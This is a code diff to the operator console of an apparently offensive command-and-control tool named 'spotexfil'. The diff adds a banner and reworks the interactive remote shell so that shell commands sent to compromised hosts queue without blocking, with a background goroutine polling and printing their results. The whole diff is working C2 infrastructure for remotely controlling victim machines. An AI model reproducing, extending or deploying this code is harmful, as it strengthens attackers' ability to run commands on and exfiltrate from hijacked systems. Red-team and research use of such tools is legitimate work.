@@ -9,6 +9,7 @@ import (
 	"sort"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/sourcefrenchy/spotexfil/internal/protocol"
@@ -206,15 +207,18 @@ func (op *Operator) startBackgroundPoller(stopCh chan struct{}) {
 
 // Interactive runs the interactive operator console.
 func (op *Operator) Interactive() {
+	fmt.Print("\033[32m")
 	fmt.Println(`
-   _____ ____   ____ _____ _____ _  _ ___ ___ _
-  / ____|  _ \ / __ \_   _| ____| \/ |  _|_ _| |
-  \__ \| |_) | |  | || | |  _|  >  <| |_ | || |
-  |___/|  __/| |  | || | | |___/ /\ \  _|| || |___
-  |____/|_|    \____/ |_| |_____/_/  \_|_||___|_____|
-                  C2 OPERATOR CONSOLE
-`)
-	fmt.Printf("  Polling every %ds | Type 'help' for commands\n\n",
+  ┌─────────────────────────────────────────────┐
+  │  ___            _   ___       __ _ _        │
+  │ / __|_ __  ___ | |_| __|__ _/ _(_) |       │
+  │ \__ \ '_ \/ _ \|  _| _|\ \ /  _| | |      │
+  │ |___/ .__/\___/ \__|___/_\_\_| |_|_|_|      │
+  │     |_|                                     │
+  │         C2 OPERATOR CONSOLE                 │
+  └─────────────────────────────────────────────┘`)
+	fmt.Print("\033[0m\n\n")
+	fmt.Printf("  \033[36mPolling every %ds\033[0m | Type '\033[1mhelp\033[0m' for commands\n\n",
 		int(op.pollInterval.Seconds()))
 
 	// Initial check for pending checkins
@@ -433,13 +437,86 @@ func (op *Operator) interactiveShell(scanner *bufio.Scanner) {
 		shellType = "powershell"
 	}
 
-	fmt.Printf("\n[*] Interactive shell to %s (%s)\n", info.Hostname, info.OS)
-	fmt.Printf("[*] Shell type: %s | Type 'quit' to return to c2>\n\n", shellType)
+	shellPrompt := fmt.Sprintf("%s@%s %s ", clientID[:8], info.Hostname, promptChar)
 
-	_ = clientID // used for display
+	fmt.Printf("\n\033[36m[*] Interactive shell to %s (%s)\033[0m\n",
+		info.Hostname, info.OS)
+	fmt.Printf("\033[36m[*] Shell: %s | Commands queue automatically | 'quit' to exit\033[0m\n\n",
+		shellType)
+
+	// Pending commands queue: seq -> command string
+	type pendingCmd struct {
+		seq int
+		cmd string
+	}
+	var pending []pendingCmd
+	var mu sync.Mutex
+
+	// Background result drainer
+	stopDrain := make(chan struct{})
+	go func() {
+		for {
+			select {
+			case <-stopDrain:
+				return
+			case <-time.After(3 * time.Second):
+				results, err := op.PollResults()
+				if err != nil || len(results) == 0 {
+					continue
+				}
+
+				mu.Lock()
+				for i := 0; i < len(pending); i++ {
+					pc := pending[i]
+					if result, ok := results[pc.seq]; ok {
+						// Clear current line, print result
+						fmt.Printf("\r\033[K")
+
+						data, _ := result["data"].(string)
+						status, _ := result["status"].(string)
+
+						// Show which command this is for
+						fmt.Printf("\033[90m$ %s\033[0m\n", pc.cmd)
+						if status == "error" {
+							fmt.Printf("\033[31m%s\033[0m", data)
+						} else {
+							fmt.Print(data)
+						}
+						if len(data) > 0 && data[len(data)-1] != '\n' {
+							fmt.Println()
+						}
+
+						// Remove from pending
+						pending = append(pending[:i], pending[i+1:]...)
+						i--
+					}
+				}
+
+				// Show queue status and re-print prompt
+				if len(pending) > 0 {
+					fmt.Printf("\033[33m[queued: %d]\033[0m ",
+						len(pending))
+				}
+				fmt.Print(shellPrompt)
+				mu.Unlock()
+			}
+		}
+	}()
+
+	defer close(stopDrain)
 
 	for {
-		fmt.Printf("%s@%s %s ", clientID[:8], info.Hostname, promptChar)
+		mu.Lock()
+		queueLen := len(pending)
+		mu.Unlock()
+
+		if queueLen > 0 {
+			fmt.Printf("\033[33m[queued: %d]\033[0m %s",
+				queueLen, shellPrompt)
+		} else {
+			fmt.Print(shellPrompt)
+		}
+
 		if !scanner.Scan() {
 			break
 		}
@@ -449,63 +526,45 @@ func (op *Operator) interactiveShell(scanner *bufio.Scanner) {
 			continue
 		}
 		if line == "quit" || line == "exit" {
+			mu.Lock()
+			remain := len(pending)
+			mu.Unlock()
+			if remain > 0 {
+				fmt.Printf("[*] Draining %d pending command(s)...\n", remain)
+				// Wait briefly for remaining results
+				deadline := time.After(15 * time.Second)
+				for {
+					mu.Lock()
+					if len(pending) == 0 {
+						mu.Unlock()
+						break
+					}
+					mu.Unlock()
+					select {
+					case <-deadline:
+						fmt.Println("[!] Timeout, some results may be lost")
+						goto exitShell
+					case <-time.After(1 * time.Second):
+					}
+				}
+			}
+		exitShell:
 			fmt.Println("[*] Leaving interactive shell")
 			return
 		}
 
-		// Send the command
+		// Send command (non-blocking)
 		seq, err := op.SendCommand("shell", map[string]interface{}{"cmd": line})
 		if err != nil {
 			fmt.Printf("[!] Failed to send: %v\n", err)
 			continue
 		}
 
-		// Wait with animated dots
-		op.waitWithAnimation(seq)
+		mu.Lock()
+		pending = append(pending, pendingCmd{seq: seq, cmd: line})
+		fmt.Printf("\033[90m  -> queued seq=%d\033[0m\n", seq)
+		mu.Unlock()
 	}
-}
-
-// waitWithAnimation polls for a result while showing animated dots.
-func (op *Operator) waitWithAnimation(seq int) {
-	fmt.Print("  ")
-
-	dotCount := 0
-	timeout := 120 * time.Second
-	pollInterval := 5 * time.Second
-	start := time.Now()
-
-	for time.Since(start) < timeout {
-		// Poll for result
-		results, err := op.PollResults()
-		if err == nil {
-			if result, ok := results[seq]; ok {
-				// Clear the dots line
-				fmt.Print("\r\033[K")
-
-				// Display output
-				data, _ := result["data"].(string)
-				status, _ := result["status"].(string)
-				if status == "error" {
-					fmt.Printf("\033[31m%s\033[0m\n", data)
-				} else {
-					fmt.Print(data)
-					if len(data) > 0 && data[len(data)-1] != '\n' {
-						fmt.Println()
-					}
-				}
-				return
-			}
-		}
-
-		// Animate dots
-		dotCount++
-		dots := strings.Repeat(".", (dotCount%3)+1)
-		fmt.Printf("\r  waiting%s   ", dots)
-		time.Sleep(pollInterval)
-	}
-
-	fmt.Print("\r\033[K")
-	fmt.Printf("[!] Timeout waiting for seq=%d\n", seq)
 }
 
 func (op *Operator) cleanAll() {
